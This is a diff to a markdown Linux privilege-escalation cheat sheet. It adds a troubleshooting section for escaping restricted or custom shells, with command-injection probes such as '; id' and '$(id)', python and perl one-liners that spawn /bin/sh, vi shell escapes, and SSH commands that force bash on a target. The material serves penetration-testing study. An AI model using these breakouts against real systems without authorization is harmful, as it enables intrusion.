@@ -52,7 +52,6 @@ Linux Privilege Escalation Decision Tree
 
 ## Manual Enumeration
 
-
 | Category | Meaning          |                                                                     |
 | -------- | ---------------- | ------------------------------------------------------------------- |
 | owner    | the file owner   |                                                                     |
@@ -154,6 +153,93 @@ which gcc
 which curl
 which wget
 ```
+
+```bash
+# Troubleshooting 
+*** unknown command: pwd  
+*** unknown command: hostname  
+*** unknown command: /usr/bin/ls
+
+1. restricted shell / custom CLI
+2. application shell, not OS shell
+3. jail/chroot-like environment
+4. SSH forced command menu
+5. network service pretending to be a shell
+   
+# Test first
+help  
+?  
+commands  
+list  
+menu  
+show  
+status  
+version  
+whoami  
+id  
+exit  
+quit  
+logout
+TAB  # try press - Sometimes custom shells expose autocomplete.
+TAB TAB # try press
+
+# Check if shell metacharacters work
+echo test  
+; id  
+&& id  
+| id  
+`id`  
+$(id)
+
+# test carefully 
+sh  
+bash  
+/bin/sh  
+/bin/bash  
+busybox sh  
+python3 -c 'import os; os.system("/bin/sh")'  
+python -c 'import os; os.system("/bin/sh")'  
+perl -e 'exec "/bin/sh";'
+
+# try 
+vi  # if opens -> :!/bin/sh -> try to get GTFOBins-style shell escapes
+vim  
+less  
+more  
+man  
+awk  
+find  
+ftp  
+scp  
+sftp  
+ssh
+
+# if SSH shell
+ssh username@target_ip /bin/bash  
+ssh username@target_ip /bin/sh  
+ssh -t username@target_ip /bin/bash  
+ssh -t username@target_ip bash --noprofile
+
+# try sftp to enumerate 
+sftp username@target_ip
+
+# if only custom prompts work: 
+help  
+show help  
+show ?  
+show config  
+show users  
+show version  
+show status  
+list  
+list users  
+list files  
+cat  
+read  
+open
+```
+
+suggests one of these:
 
 
 ### Enumerate Local Users
